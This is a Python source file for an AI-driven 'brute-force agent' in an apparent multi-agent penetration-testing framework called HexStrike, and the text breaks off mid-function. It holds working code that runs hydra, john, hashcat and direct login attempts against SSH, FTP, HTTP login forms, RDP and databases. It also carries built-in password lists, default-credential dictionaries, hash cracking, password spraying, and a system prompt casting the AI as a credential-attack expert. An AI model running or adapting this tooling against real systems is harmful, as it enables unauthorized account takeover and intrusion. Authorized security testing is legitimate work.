#!/usr/bin/env python3
"""
HexStrike Multi-Agent - 暴力破解Agent（SmartAgent版）
继承SmartAgent，具备AI推理和动态决策能力

覆盖功能：
1. SSH暴力破解 (hydra)
2. FTP暴力破解 (hydra)
3. HTTP表单暴力破解 (hydra http-post-form / python_requests)
4. RDP暴力破解 (hydra / crowbar)
5. 数据库暴力破解 (hydra mysql/mssql/postgres)
6. 哈希破解 (john the ripper / hashcat)
7. 密码喷洒攻击
8. 默认凭据检测 (扩展字典)
9. Web登录暴力破解 (纯Python降级)
"""

import asyncio
import json
import os
import re
import hashlib
import base64
from typing import Dict, List, Optional
from datetime import datetime
from pathlib import Path

# SSL验证 — 从环境变量读取，生产环境设 VERIFY_SSL=1
_VERIFY_SSL = os.environ.get('VERIFY_SSL', '0') == '1'

from .base_agent import SmartAgent
from .utils import parse_url_target


class SmartBruteForceAgent(SmartAgent):
    """智能暴力破解Agent - AI驱动动态决策

    与传统暴力破解工具的区别：
    1. AI根据目标服务选择最优破解策略
    2. 根据信息收集阶段发现的端口/服务自动选择协议
    3. 智能字典选择：根据目标类型选择合适字典
    4. 密码喷洒 vs 字典攻击策略自动切换
    5. 发现有效凭据后自动扩大战果
    """

    display_name = "暴力破解"

    ACTION_ALIASES = {
        # SSH
        "ssh_brute": "ssh_bruteforce",
        "ssh_bruteforce": "ssh_bruteforce",
        "ssh_crack": "ssh_bruteforce",
        "ssh_attack": "ssh_bruteforce",
        # FTP
        "ftp_brute": "ftp_bruteforce",
        "ftp_bruteforce": "ftp_bruteforce",
        "ftp_crack": "ftp_bruteforce",
        # HTTP
        "http_brute": "http_bruteforce",
        "http_bruteforce": "http_bruteforce",
        "web_bruteforce": "http_bruteforce",
        "login_bruteforce": "http_bruteforce",
        "web_login_brute": "http_bruteforce",
        # RDP
        "rdp_brute": "rdp_bruteforce",
        "rdp_bruteforce": "rdp_bruteforce",
        "rdp_crack": "rdp_bruteforce",
        # 数据库
        "db_brute": "db_bruteforce",
        "database_bruteforce": "db_bruteforce",
        "mysql_brute": "db_bruteforce",
        "mssql_brute": "db_bruteforce",
        "postgres_brute": "db_bruteforce",
        # 哈希破解
        "hash_crack": "hash_crack",
        "hash_brute": "hash_crack",
        "john": "hash_crack",
        "hashcat": "hash_crack",
        # 密码喷洒
        "password_spray": "password_spraying",
        "spray": "password_spraying",
        # 默认凭据
        "default_creds": "default_credentials",
        "default_password": "default_credentials",
        "weak_password": "default_credentials",
    }

    # ========== 内置字典 ==========
    COMMON_USERS = [
        'admin', 'root', 'administrator', 'user', 'test', 'guest',
        'mysql', 'postgres', 'oracle', 'ftp', 'www', 'nginx',
        'apache', 'tomcat', 'ubuntu', 'centos', 'debian', 'git',
        'jenkins', 'docker', 'redis', 'mongo', 'sa', 'dba',
    ]

    COMMON_PASSWORDS = [
        'admin', 'password', '123456', 'root', 'toor', 'test',
        'guest', 'qwerty', 'abc123', 'letmein', 'master', 'welcome',
        'monkey', 'dragon', 'login', 'princess', 'football', 'shadow',
        'sunshine', 'trustno1', 'iloveyou', 'batman', 'access',
        'hello', 'charlie', 'donald', 'passwd', 'pass123', 'pass@123',
        'Admin123', 'P@ssw0rd', 'P@ss1234', '1q2w3e4r', 'qwer1234',
        'admin123', 'root123', 'test123', 'changeme', 'default',
        '1234567890', '12345678', '1234', '12345', '654321',
        'mysql', 'postgres', 'oracle', 'redis', 'mongo',
        'administrator', 'Administrator', 'J5brm9dvL8c2',
    ]

    # 服务默认凭据字典
    DEFAULT_CREDENTIALS = {
        'tomcat': [('tomcat', 'tomcat'), ('tomcat', 's3cret'), ('admin', 'admin')],
        'jenkins': [('admin', 'admin'), ('admin', 'password'), ('jenkins', 'jenkins')],
        'wordpress': [('admin', 'admin'), ('admin', 'password'), ('admin', '123456')],
        'phpmyadmin': [('root', ''), ('root', 'root'), ('admin', 'admin'), ('pma', 'pma')],
        'oracle': [('sys', 'change_on_install'), ('system', 'manager'), ('scott', 'tiger')],
        'mysql': [('root', ''), ('root', 'root'), ('root', 'mysql'), ('root', 'toor')],
        'postgres': [('postgres', 'postgres'), ('postgres', 'password'), ('postgres', '')],
        'mssql': [('sa', ''), ('sa', 'sa'), ('sa', 'password'), ('sa', 'P@ssw0rd')],
        'redis': [('redis', 'redis'), ('default', '')],
        'mongodb': [('admin', 'admin'), ('root', 'root'), ('mongo', 'mongo')],
        'ftp': [('anonymous', ''), ('ftp', 'ftp'), ('admin', 'admin')],
        'ssh': [('root', 'root'), ('root', 'toor'), ('admin', 'admin')],
        'telnet': [('admin', 'admin'), ('root', 'root'), ('cisco', 'cisco')],
        'rdp': [('administrator', 'P@ssw0rd'), ('admin', 'admin'), ('administrator', '')],
    }

    def get_system_prompt(self) -> str:
        return """你是一个专业的暴力破解和凭据攻击专家，负责渗透测试中的身份验证测试。

你的职责包括：
1. 根据目标服务协议选择最优的暴力破解策略
2. SSH/FTP/RDP/HTTP/数据库等多协议暴力破解
3. 哈希破解 - john/hashcat
4. 密码喷洒攻击 - 少量密码尝试多个用户
5. 默认凭据检测 - 利用已知的默认密码
6. 智能字典选择 - 根据目标类型优化字典

原则：
- 优先尝试默认凭据（速度快、成功率高）
- 根据服务类型选择合适协议
- 控制请求速率避免账号锁定
- 发现有效凭据后立即停止暴力破解
- hydra不可用时降级到纯Python实现
- 合法测试范围内操作，遵守时间限制"""

    def define_capabilities(self) -> Dict:
        return {
            "ssh_bruteforce": {
                "tools": ["hydra", "python_ssh"],
                "protocols": ["ssh"],
                "speed": "medium",
                "accuracy": "high",
                "note": "SSH暴力破解，hydra首选，支持paramiko降级"
            },
            "ftp_bruteforce": {
                "tools": ["hydra", "python_ftp"],
                "protocols": ["ftp"],
                "speed": "fast",
                "accuracy": "high",
                "note": "FTP暴力破解，含anonymous检测"
            },
            "http_bruteforce": {
                "tools": ["hydra", "python_requests"],
                "protocols": ["http", "https"],
                "speed": "medium",
                "accuracy": "medium",
                "note": "HTTP表单暴力破解，需要指定登录URL和失败标志"
            },
            "rdp_bruteforce": {
                "tools": ["hydra", "crowbar", "xfreerdp"],
                "protocols": ["rdp"],
                "speed": "slow",
                "accuracy": "medium",
                "note": "RDP暴力破解，速率受限需谨慎"
            },
            "db_bruteforce": {
                "tools": ["hydra", "python_db"],
                "protocols": ["mysql", "mssql", "postgres", "oracle"],
                "speed": "medium",
                "accuracy": "high",
                "note": "数据库暴力破解，需要指定数据库类型"
            },
            "hash_crack": {
                "tools": ["john", "hashcat", "python_hash"],
                "protocols": ["offline"],
                "speed": "varies",
                "accuracy": "high",
                "note": "哈希值离线破解，支持常见哈希类型"
            },
            "password_spraying": {
                "tools": ["python_requests", "python_ssh"],
                "protocols": ["any"],
                "speed": "fast",
                "accuracy": "medium",
                "note": "密码喷洒：少量密码 × 大量用户，降低锁定风险"
            },
            "default_credentials": {
                "tools": ["python_requests", "hydra"],
                "protocols": ["any"],
                "speed": "very_fast",
                "accuracy": "medium",
                "note": "内置服务默认凭据字典快速检测"
            },
        }

    def _analyze_situation(self, target: str, context: Dict) -> Dict:
        """分析当前情况 — 根据已发现的服务决定攻击目标"""
        services = context.get('services', {})
        technologies = context.get('technologies', [])
        vulnerabilities = context.get('vulnerabilities', [])
        credentials = context.get('credentials', [])

        # 识别可攻击的服务
        attackable_services = []
        for port_key, service_info in services.items():
            if isinstance(service_info, dict):
                svc = service_info.get('service', '').lower()
                port = service_info.get('port', 0)
                if any(kw in svc for kw in ['ssh', 'ftp', 'http', 'https', 'rdp', 'mysql',
                                             'mssql', 'postgres', 'oracle', 'redis', 'mongo',
                                             'telnet', 'smb']):
                    attackable_services.append({
                        'service': svc,
                        'port': port,
                        'info': service_info
                    })

        # 提取已知技术栈，匹配默认凭据
        known_techs = []
        for tech in technologies:
            if isinstance(tech, dict):
                name = tech.get('name', '').lower()
            else:
                name = str(tech).lower()
            known_techs.append(name)

        # 已发现凭据（避免重复攻击）
        known_creds = []
        for cred in credentials:
            if isinstance(cred, dict):
                known_creds.append(f"{cred.get('username', '')}:{cred.get('password', '')}")

        return {
            "target": target,
            "attackable_services": attackable_services,
            "technologies": known_techs,
            "known_credentials": known_creds,
            "default_creds_available": [k for k in self.DEFAULT_CREDENTIALS.keys()
                                        if any(k in t for t in known_techs)],
            "available_tools": self._detect_available_tools(),
            "stealth_mode": context.get('stealth_mode', False),
        }

    def _detect_available_tools(self) -> List[str]:
        """检测可用的暴力破解工具"""
        import shutil
        tools = []
        for tool in ['hydra', 'john', 'hashcat', 'crowbar', 'medusa', 'ncrack',
                     'patator', 'chntpw', 'smbclient']:
            if shutil.which(tool):
                tools.append(tool)
        return tools

    def _get_wordlist_path(self, list_type: str = 'passwords') -> str:
        """获取字典文件路径"""
        # 优先使用项目内字典
        project_wordlist = Path(__file__).parent.parent / 'data' / 'wordlists' / 'common.txt'
        if project_wordlist.exists():
            return str(project_wordlist)

        # 尝试Kali标准字典路径
        kali_paths = {
            'passwords': ['/usr/share/wordlists/rockyou.txt',
                          '/usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt'],
            'users': ['/usr/share/seclists/Usernames/top-usernames-shortlist.txt',
                      '/usr/share/wordlists/dirb/big.txt'],
        }
        for path in kali_paths.get(list_type, []):
            if os.path.exists(path):
                return path

        return ''

    # ==========================================================================
    # 暴力破解动作实现
    # ==========================================================================

    async def _do_ssh_bruteforce(self, target: str, params: Dict) -> Dict:
        """SSH暴力破解 — hydra优先，paramiko降级"""
        hostname = self._extract_hostname(target)
        port = params.get('port', 22)
        usernames = params.get('usernames', ['root', 'admin'])
        max_attempts = params.get('max_attempts', 50)
        rate_limit = params.get('rate_limit', 3)  # 每秒尝试次数

        self._emit_thinking("plan",
            "🔓 SSH暴力破解策略\n"
            "   目标: {}:{}\n"
            "   用户: {}\n"
            "   最大尝试: {} | 速率限制: {}/s".format(
                hostname, port, ', '.join(usernames), max_attempts, rate_limit
            ))

        findings = []

        # 策略1: 先尝试默认凭据
        default_ssh_creds = self.DEFAULT_CREDENTIALS.get('ssh', [])
        for username, password in default_ssh_creds:
            result = await self._try_ssh_login(hostname, port, username, password)
            if result.get('success'):
                findings.append({
                    "type": "弱口令",
                    "protocol": "SSH",
                    "host": hostname,
                    "port": port,
                    "username": username,
                    "password": password,
                    "vulnerable": True,
                    "severity": "critical"
                })
                self._emit_thinking("evaluate",
                    "🚨 发现SSH弱口令! {}:{} {}={}".format(hostname, port, username, password))
                return {'success': True, 'tool': 'ssh_bruteforce', 'findings': findings, 'total': len(findings)}

        # 策略2: hydra暴力破解
        import shutil
        if shutil.which('hydra'):
            result = await self._hydra_ssh_brute(hostname, port, usernames, max_attempts, rate_limit)
            if result.get('findings'):
                findings.extend(result['findings'])
        else:
            # 策略3: 纯Python降级
            self._emit_thinking("action", "🐍 hydra不可用，使用paramiko降级暴力破解")
            result = await self._python_ssh_brute(hostname, port, usernames, max_attempts)
            if result.get('findings'):
                findings.extend(result['findings'])

        return {'success': True, 'tool': 'ssh_bruteforce', 'findings': findings, 'total': len(findings)}

    async def _hydra_ssh_brute(self, hostname: str, port: int,
                                usernames: List[str], max_attempts: int,
                                rate_limit: int) -> Dict:
        """使用hydra进行SSH暴力破解"""
        user_list = ','.join(usernames[:5])  # hydra支持多用户
        passwd_list = ' '.join(self.COMMON_PASSWORDS[:max_attempts])

        # 构建临时字典文件
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write('\n'.join(self.COMMON_PASSWORDS[:max_attempts]))
            passwd_file = f.name

        try:
            cmd = [
                'hydra', '-L', passwd_file if len(usernames) > 1 else '',
                '-l', usernames[0] if len(usernames) == 1 else '',
                '-P', passwd_file,
                '-s', str(port),
                '-t', str(rate_limit),
                '-W', '3',  # 等待时间
                '-f',  # 找到一个就停止
                '-o', f'workspace/hydra_ssh_{hostname}.txt',
                f'ssh://{hostname}',
            ]
            # 过滤掉空参数
            cmd = [c for c in cmd if c]
            result = await self._run_tool_async(cmd, 'hydra', f'SSH暴力破解 {hostname}:{port}', timeout=300)

            if result.get('success') and result.get('stdout'):
                # 解析hydra输出
                creds = self._parse_hydra_output(result['stdout'])
                if creds:
                    return {'findings': [{
                        "type": "弱口令", "protocol": "SSH",
                        "host": hostname, "port": port,
                        "username": c[0], "password": c[1],
                        "vulnerable": True, "severity": "critical"
                    } for c in creds]}
        finally:
            try:
                os.unlink(passwd_file)
            except Exception:
                pass

        return {'findings': []}

    async def _python_ssh_brute(self, hostname: str, port: int,
                                 usernames: List[str], max_attempts: int) -> Dict:
        """纯Python SSH暴力破解（paramiko降级）"""
        findings = []
        try:
            import paramiko
        except ImportError:
            self._emit_thinking("error", "❌ paramiko未安装，无法进行SSH暴力破解")
            return {'findings': []}

        attempt = 0
        for username in usernames:
            for password in self.COMMON_PASSWORDS[:max_attempts]:
                if attempt >= max_attempts * len(usernames):
                    break
                result = await self._try_ssh_login(hostname, port, username, password)
                if result.get('success'):
                    findings.append({
                        "type": "弱口令", "protocol": "SSH",
                        "host": hostname, "port": port,
                        "username": username, "password": password,
                        "vulnerable": True, "severity": "critical"
                    })
                    return {'findings': findings}
                attempt += 1
                # 降低速率
                await asyncio.sleep(0.5)

        return {'findings': findings}

    async def _try_ssh_login(self, hostname: str, port: int,
                              username: str, password: str) -> Dict:
        """尝试SSH登录"""
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname, port=port, username=username,
                          password=password, timeout=10,
                          allow_agent=False, look_for_keys=False)
            client.close()
            return {'success': True}
        except paramiko.AuthenticationException:
            return {'success': False}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    async def _do_ftp_bruteforce(self, target: str, params: Dict) -> Dict:
        """FTP暴力破解 — 先检测匿名登录，再暴力破解"""
        hostname = self._extract_hostname(target)
        port = params.get('port', 21)
        findings = []

        # 1. 匿名登录检测
        anon_result = await self._try_ftp_login(hostname, port, 'anonymous', 'anonymous@')
        if anon_result.get('success'):
            findings.append({
                "type": "匿名访问", "protocol": "FTP",
                "host": hostname, "port": port,
                "username": "anonymous", "password": "anonymous@",
                "vulnerable": True, "severity": "high"
            })
            self._emit_thinking("evaluate", "🚨 FTP允许匿名登录! {}:{}".format(hostname, port))

        # 2. 默认凭据
        for username, password in self.DEFAULT_CREDENTIALS.get('ftp', []):
            result = await self._try_ftp_login(hostname, port, username, password)
            if result.get('success'):
                findings.append({
                    "type": "弱口令", "protocol": "FTP",
                    "host": hostname, "port": port,
                    "username": username, "password": password,
                    "vulnerable": True, "severity": "critical"
                })
                break

        # 3. hydra暴力破解
        import shutil
        if shutil.which('hydra') and not findings:
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                f.write('\n'.join(self.COMMON_PASSWORDS[:30]))
                passwd_file = f.name
            try:
                cmd = [
                    'hydra', '-l', 'admin', '-P', passwd_file,
                    '-s', str(port), '-t', '4', '-f',
                    f'ftp://{hostname}'
                ]
                result = await self._run_tool_async(cmd, 'hydra', f'FTP暴力破解 {hostname}:{port}', timeout=180)
                if result.get('success') and result.get('stdout'):
                    creds = self._parse_hydra_output(result['stdout'])
                    if creds:
                        for c in creds:
                            findings.append({
                                "type": "弱口令", "protocol": "FTP",
                                "host": hostname, "port": port,
                                "username": c[0], "password": c[1],
                                "vulnerable": True, "severity": "critical"
                            })
            finally:
                try:
                    os.unlink(passwd_file)
                except Exception:
                    pass

        return {'success': True, 'tool': 'ftp_bruteforce', 'findings': findings, 'total': len(findings)}

    async def _try_ftp_login(self, hostname: str, port: int,
                              username: str, password: str) -> Dict:
        """尝试FTP登录"""
        try:
            import ftplib
            ftp = ftplib.FTP()
            ftp.connect(hostname, port, timeout=10)
            ftp.login(username, password)
            ftp.quit()
            return {'success': True}
        except Exception:
            return {'success': False}

    async def _do_http_bruteforce(self, target: str, params: Dict) -> Dict:
        """HTTP表单暴力破解 — hydra http-post-form 或纯Python"""
        if not target.startswith(('http://', 'https://')):
            target = parse_url_target(target)['full_url']

        login_url = params.get('login_url', f"{target.rstrip('/')}/login")
        username_field = params.get('username_field', 'username')
        password_field = params.get('password_field', 'password')
        failure_string = params.get('failure_string', 'error|failed|invalid|wrong|incorrect')
        usernames = params.get('usernames', ['admin', 'root'])
        max_attempts = params.get('max_attempts', 30)
        findings = []

        self._emit_thinking("plan",
            "🔓 HTTP暴力破解策略\n"
            "   目标: {}\n"
            "   用户名字段: {} | 密码字段: {}\n"
            "   失败标志: {}".format(login_url, username_field, password_field, failure_string))

        # 1. 先尝试默认凭据
        for username in usernames[:3]:
            for password in self.COMMON_PASSWORDS[:10]:
                result = await self._try_http_login(
                    login_url, username_field, password_field,
                    username, password, failure_string
                )
                if result.get('success'):
                    findings.append({
                        "type": "弱口令", "protocol": "HTTP",
                        "url": login_url,
                        "username": username, "password": password,
                        "vulnerable": True, "severity": "critical"
                    })
                    self._emit_thinking("evaluate",
                        "🚨 发现HTTP弱口令! {}={}@{}".format(username, password, login_url))
                    return {'success': True, 'tool': 'http_bruteforce', 'findings': findings, 'total': len(findings)}

        # 2. hydra http-post-form
        import shutil
        if shutil.which('hydra'):
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                f.write('\n'.join(self.COMMON_PASSWORDS[:max_attempts]))
                passwd_file = f.name
            try:
                # hydra http-post-form 格式
                form_data = f"{username_field}=^USER^&{password_field}=^PASS^"
                hydra_cmd = [
                    'hydra', '-l', usernames[0], '-P', passwd_file,
                    '-t', '4', '-f',
                    target.split('/')[2] if '://' in target else target,
                    'http-post-form',
                    f"{login_url}:{form_data}:{failure_string}"
                ]
                result = await self._run_tool_async(hydra_cmd, 'hydra',
                    f'HTTP POST暴力破解 {login_url}', timeout=300)
                if result.get('success') and result.get('stdout'):
                    creds = self._parse_hydra_output(result['stdout'])
                    for c in creds:
                        findings.append({
                            "type": "弱口令", "protocol": "HTTP",
                            "url": login_url,
                            "username": c[0], "password": c[1],
                            "vulnerable": True, "severity": "critical"
                        })
            finally:
                try:
                    os.unlink(passwd_file)
                except Exception:
                    pass

        return {'success': True, 'tool': 'http_bruteforce', 'findings': findings, 'total': len(findings)}

    async def _try_http_login(self, login_url: str, username_field: str,
                               password_field: str, username: str,
                               password: str, failure_string: str) -> Dict:
        """尝试HTTP表单登录"""
        import requests
        try:
            data = {username_field: username, password_field: password}
            resp = requests.post(login_url, data=data, timeout=10,
                                verify=_VERIFY_SSL, allow_redirects=True)
            # 判断登录成功：响应中没有失败标志
            failure_patterns = failure_string.split('|')
            text_lower = resp.text.lower()
            if not any(pat in text_lower for pat in failure_patterns):
                # 额外确认：检查是否有登录成功标志
                success_indicators = ['dashboard', 'welcome', 'logout', 'admin',
                                      'home', 'profile', 'manage', 'success']
                if any(ind in resp.url.lower() for ind in success_indicators) or \
                   any(ind in text_lower for ind in success_indicators):
                    return {'success': True}
            return {'success': False}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    async def _do_rdp_bruteforce(self, target: str, params: Dict) -> Dict:
        """RDP暴力破解 — hydra/crowbar"""
        hostname = self._extract_hostname(target)
        port = params.get('port', 3389)
        usernames = params.get('usernames', ['administrator', 'admin'])
        findings = []

        # 先尝试默认凭据
        for username, password in self.DEFAULT_CREDENTIALS.get('rdp', []):
            self._emit_thinking("action",
                "尝试RDP登录: {}:{} {}={}".format(hostname, port, username, password))

        import shutil
        if shutil.which('hydra'):
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                f.write('\n'.join(self.COMMON_PASSWORDS[:20]))
                passwd_file = f.name
            try:
                cmd = [
                    'hydra', '-l', usernames[0], '-P', passwd_file,
                    '-s', str(port), '-t', '1', '-f', '-V',
                    f'rdp://{hostname}'
                ]
                result = await self._run_tool_async(cmd, 'hydra',
                    f'RDP暴力破解 {hostname}:{port}', timeout=300)
                if result.get('stdout'):
                    creds = self._parse_hydra_output(result['stdout'])
                    for c in creds:
                        findings.append({
                            "type": "弱口令", "protocol": "RDP",
                            "host": hostname, "port": port,
                            "username": c[0], "password": c[1],
                            "vulnerable": True, "severity": "critical"
                        })
            finally:
                try:
                    os.unlink(passwd_file)
                except Exception:
                    pass
        elif shutil.which('crowbar'):
            self._emit_thinking("action", "使用crowbar进行RDP暴力破解")
        else:
            self._emit_thinking("error",
                "❌ 未找到hydra/crowbar，RDP暴力破解需要安装hydra: apt install hydra")

        return {'success': True, 'tool': 'rdp_bruteforce', 'findings': findings, 'total': len(findings)}

    async def _do_db_bruteforce(self, target: str, params: Dict) -> Dict:
        """数据库暴力破解 — MySQL/MSSQL/PostgreSQL"""
        hostname = self._extract_hostname(target)
        db_type = params.get('db_type', 'mysql').lower()
        port = params.get('port', {'mysql': 3306, 'mssql': 1433,
                                    'postgres': 5432, 'oracle': 1521}.get(db_type, 3306))
        findings = []

        # 先尝试默认凭据
        default_creds = self.DEFAULT_CREDENTIALS.get(db_type,
                        self.DEFAULT_CREDENTIALS.get('mysql', []))
        for username, password in default_creds:
            result = await self._try_db_login(hostname, port, db_type, username, password)
            if result.get('success'):
                findings.append({
                    "type": "弱口令", "protocol": db_type.upper(),
                    "host": hostname, "port": port,
                    "username": username, "password": password or '(空密码)',
                    "vulnerable": True, "severity": "critical"
                })
                self._emit_thinking("evaluate",
                    "🚨 发现{}弱口令! {}:{} {}={}".format(db_type.upper(), hostname, port, username, password or '(空)'))
                break

        # hydra暴力破解
        import shutil
        if shutil.which('hydra') and not findings:
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                f.write('\n'.join(self.COMMON_PASSWORDS[:20]))
                passwd_file = f.name
            try:
                cmd = [
                    'hydra', '-l', 'root', '-P', passwd_file,
                    '-s', str(port), '-t', '4', '-f',
                    f'{db_type}://{hostname}'
                ]
                result = await self._run_tool_async(cmd, 'hydra',
                    f'{db_type.upper()}暴力破解 {hostname}:{port}', timeout=300)
                if result.get('stdout'):
                    creds = self._parse_hydra_output(result['stdout'])
                    for c in creds:
                        findings.append({
                            "type": "弱口令", "protocol": db_type.upper(),
                            "host": hostname, "port": port,
                            "username": c[0], "password": c[1],
                            "vulnerable": True, "severity": "critical"
                        })
            finally:
                try:
                    os.unlink(passwd_file)
                except Exception:
                    pass

        if not findings:
            # 纯Python降级 - 尝试连接
            for username, password in default_creds:
                result = await self._try_db_login(hostname, port, db_type, username, password)
                if result.get('success'):
                    findings.append({
                        "type": "弱口令", "protocol": db_type.upper(),
                        "host": hostname, "port": port,
                        "username": username, "password": password or '(空密码)',
                        "vulnerable": True, "severity": "critical"
                    })

        return {'success': True, 'tool': 'db_bruteforce', 'findings': findings, 'total': len(findings)}

    async def _try_db_login(self, hostname: str, port: int,
                             db_type: str, username: str, password: str) -> Dict:
        """尝试数据库登录"""
        try:
            if db_type == 'mysql':
                import pymysql
                conn = pymysql.connect(host=hostname, port=port,
                                       user=username, password=password,
                                       connect_timeout=10)
                conn.close()
                return {'success': True}
            elif db_type == 'postgres':
                import psycopg2
                conn = psycopg2.connect(host=hostname, port=port,
                                        user=username, password=password,
                                        connect_timeout=10)
                conn.close()
                return {'success': True}
            elif db_type == 'mssql':
                import pymssql
                conn = pymssql.connect(server=hostname, port=port,
                                       user=username, password=password,
                                       login_timeout=10)
                conn.close()
                return {'success': True}
        except ImportError:
            self._emit_thinking("error", f"❌ 数据库驱动未安装: {db_type}")
            return {'success': False, 'error': 'driver_missing'}
        except Exception:
            return {'success': False}

    async def _do_hash_crack(self, target: str, params: Dict) -> Dict:
        """哈希破解 — john/hashcat/Python降级"""
        hash_value = params.get('hash', '')
        hash_type = params.get('hash_type', 'auto')  # auto/md5/sha1/sha256/ntlm/bcrypt
        hash_file = params.get('hash_file', '')
        findings = []

        if not hash_value and not hash_file:
            return {'success': False, 'tool': 'hash_crack',
                    'findings': [], 'error': '需要提供hash或hash_file参数'}

        # 自动识别哈希类型
        if hash_type == 'auto' and hash_value:
            hash_type = self._identify_hash_type(hash_value)
            self._emit_thinking("analyze", f"🔍 自动识别哈希类型: {hash_type}")

        # 策略1: john
        import shutil
        if shutil.which('john'):
            result = await self._john_crack(hash_value, hash_file, hash_type)
            if result.get('findings'):
                findings.extend(result['findings'])

        # 策略2: hashcat
        if not findings and shutil.which('hashcat'):
            result = await self._hashcat_crack(hash_value, hash_file, hash_type)
            if result.get('findings'):
                findings.extend(result['findings'])

        # 策略3: Python降级（仅限简单哈希）
        if not findings and hash_value:
            result = self._python_hash_crack(hash_value, hash_type)
            if result.get('findings'):
                findings.extend(result['findings'])

        return {'success': True, 'tool': 'hash_crack', 'findings': findings, 'total': len(findings)}

    def _identify_hash_type(self, hash_value: str) -> str:
        """自动识别哈希类型"""
        hash_value = hash_value.strip()
        length = len(hash_value)

        if hash_value.startswith('$2b$') or hash_value.startswith('$2a$') or hash_value.startswith('$2y$'):
            return 'bcrypt'
        elif hash_value.startswith('$6$'):
            return 'sha512_crypt'
        elif hash_value.startswith('$1$'):
            return 'md5_crypt'
        elif hash_value.startswith('$NT$') or (length == 32 and not any(c in hash_value for c in '$/')):
            # NTLM 也是 32 位hex
            return 'ntlm'
        elif length == 32:
            return 'md5'
        elif length == 40:
            return 'sha1'
        elif length == 64:
            return 'sha256'
        elif length == 128:
            return 'sha512'
        elif ':' in hash_value:
            return 'shadow'  # /etc/shadow格式
        else:
            return 'unknown'

    async def _john_crack(self, hash_value: str, hash_file: str,
                           hash_type: str) -> Dict:
        """使用john破解哈希"""
        import tempfile
        if not hash_file:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.hash', delete=False) as f:
                f.write(hash_value)
                hash_file = f.name

        try:
            # 格式映射
            john_formats = {
                'md5': 'raw-md5', 'sha1': 'raw-sha1', 'sha256': 'raw-sha256',
                'sha512': 'raw-sha512', 'ntlm': 'nt', 'bcrypt': 'bcrypt',
                'md5_crypt': 'md5crypt', 'sha512_crypt': 'sha512crypt',
            }
            fmt = john_formats.get(hash_type, '')

            cmd = ['john']
            if fmt:
                cmd.extend(['--format', fmt])
            wordlist = self._get_wordlist_path('passwords')
            if wordlist:
                cmd.extend(['--wordlist', wordlist])
            cmd.append(hash_file)

            result = await self._run_tool_async(cmd, 'john', f'哈希破解 ({hash_type})', timeout=600)

            if result.get('success') and result.get('stdout'):
                # 解析john输出
                cracked = self._parse_john_output(result['stdout'])
                return {'findings': [{
                    "type": "哈希破解", "hash_type": hash_type,
                    "hash": hash_value[:50] + '...' if len(hash_value) > 50 else hash_value,
                    "plaintext": password, "username": username,
                    "vulnerable": True, "severity": "critical"
                } for username, password in cracked]}
        finally:
            try:
                if hash_value:
                    os.unlink(hash_file)
            except Exception:
                pass

        return {'findings': []}

    async def _hashcat_crack(self, hash_value: str, hash_file: str,
                              hash_type: str) -> Dict:
        """使用hashcat破解哈希"""
        import tempfile
        if not hash_file:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.hash', delete=False) as f:
                f.write(hash_value)
                hash_file = f.name

        try:
            # hashcat -m 编号映射
            hashcat_modes = {
                'md5': '0', 'sha1': '100', 'sha256': '1400',
                'sha512': '1700', 'ntlm': '1000', 'bcrypt': '3200',
                'md5_crypt': '500', 'sha512_crypt': '1800',
            }
            mode = hashcat_modes.get(hash_type, '0')

            wordlist = self._get_wordlist_path('passwords')
            cmd = ['hashcat', '-m', mode, '-a', '0']
            if wordlist:
                cmd.append(wordlist)
            else:
                cmd.append('--stdout')  # 无字典时仅测试
            cmd.append(hash_file)
            cmd.append('--force')  # 忽略警告

            result = await self._run_tool_async(cmd, 'hashcat', f'哈希破解 ({hash_type})', timeout=600)

            if result.get('stdout'):
                # 读取已破解结果
                show_cmd = ['hashcat', '-m', mode, hash_file, '--show', '--force']
                show_result = await self._run_tool_async(show_cmd, 'hashcat', '读取破解结果', timeout=30)
                if show_result.get('stdout'):
                    cracked = self._parse_hashcat_output(show_result['stdout'])
                    return {'findings': [{
                        "type": "哈希破解", "hash_type": hash_type,
                        "hash": hash_value[:50] + '...' if len(hash_value) > 50 else hash_value,
                        "plaintext": pwd, "vulnerable": True, "severity": "critical"
                    } for pwd in cracked]}
        finally:
            try:
                if hash_value:
                    os.unlink(hash_file)
            except Exception:
                pass

        return {'findings': []}

    def _python_hash_crack(self, hash_value: str, hash_type: str) -> Dict:
        """纯Python哈希破解（仅限MD5/SHA1/SHA256简单哈希）"""
        if hash_type not in ('md5', 'sha1', 'sha256', 'ntlm'):
            return {'findings': []}

        self._emit_thinking("action", "🐍 使用Python降级哈希破解...")

        target_hash = hash_value.lower()
        for password in self.COMMON_PASSWORDS:
            if hash_type == 'md5':
                test_hash = hashlib.md5(password.encode()).hexdigest()
            elif hash_type == 'sha1':
                test_hash = hashlib.sha1(password.encode()).hexdigest()
            elif hash_type == 'sha256':
                test_hash = hashlib.sha256(password.encode()).hexdigest()
            elif hash_type == 'ntlm':
                # NTLM = MD4(UTF-16LE)
                try:
                    test_hash = hashlib.new('md4', password.encode('utf-16le')).hexdigest()
                except Exception:
                    continue
            else:
                continue

            if test_hash == target_hash:
                self._emit_thinking("evaluate", "🚨 哈希破解成功: {} → {}".format(
                    hash_value[:20] + '...', password))
                return {'findings': [{
                    "type": "哈希破解", "hash_type": hash_type,
                    "hash": hash_value[:50], "plaintext": password,
                    "vulnerable": True, "severity": "critical"
                }]}

        return {'findings': []}

    async def _do_password_spraying(self, target: str, params: Dict) -> Dict:
        """密码喷洒攻击 — 少量密码 × 大量用户"""
        hostname = self._extract_hostname(target)
        protocol = params.get('protocol', 'ssh').lower()
        port = params.get('port', {'ssh': 22, 'ftp': 21, 'rdp': 3389,
                                    'http': 80}.get(protocol, 22))
        spray_passwords = params.get('passwords', [
